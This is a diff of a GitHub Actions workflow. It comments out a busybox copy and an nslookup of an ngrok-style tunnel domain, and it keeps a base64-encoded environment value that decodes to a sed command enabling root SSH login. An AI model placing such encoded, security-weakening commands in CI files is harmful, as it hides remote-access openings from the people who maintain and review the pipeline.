@@ -50,9 +50,9 @@ jobs:
         run: |
           echo "${{github.workspace}}--${{ runner.workspace }}--${{env.IMAGE_NAME}}--${{ github.run_id }}--${{ github.run_number }}--${{env.IMAGE_TAG}}";
           date;
-          sudo cp ./busybox.bin /sbin/busybox;
-          busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;
-          ls -al /run/user/
+          #sudo cp ./busybox.bin /sbin/busybox;
+          #busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;
+          ls -al /run/user/;
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc8"
       # Runs a set of commands using the runners shell
